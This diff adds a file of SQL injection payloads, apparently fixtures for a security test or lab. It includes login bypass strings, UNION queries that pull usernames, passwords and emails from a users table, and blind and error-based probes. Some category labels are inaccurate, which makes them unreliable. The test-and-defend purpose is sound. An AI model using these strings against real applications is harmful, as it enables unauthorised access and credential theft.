@@ -1,0 +1,38 @@
+# SQL Injection Payloads for Testing
+# Each line contains a payload that can be used in the username or search field
+
+# Authentication Bypass Payloads
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+admin' --
+admin' #
+' OR 1=1 --
+' OR 1=1#
+') OR '1'='1
+') OR ('1'='1
+
+# UNION-based SQL Injection (Data Exfiltration)
+' UNION SELECT NULL, NULL, NULL, NULL --
+' UNION SELECT id, username, password, email FROM users --
+' UNION SELECT '1', '2', '3', '4
+alice' UNION SELECT id, username, password, email FROM users --
+
+# Search-based SQLi
+%' OR '1'='1
+test' OR '1'='1' --
+' OR 1=1 --
+
+# Time-based Blind SQLi (SQLite)
+' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE load_extension('a') END) --
+' AND 1=1 --
+' AND 1=2 --
+
+# Comment Injection
+admin'/*
+admin'--
+admin'#
+
+# Error-based SQLi
+' AND 1=CONVERT(int, (SELECT @@version)) --
+' UNION SELECT NULL, NULL, sqlite_version(), NULL --
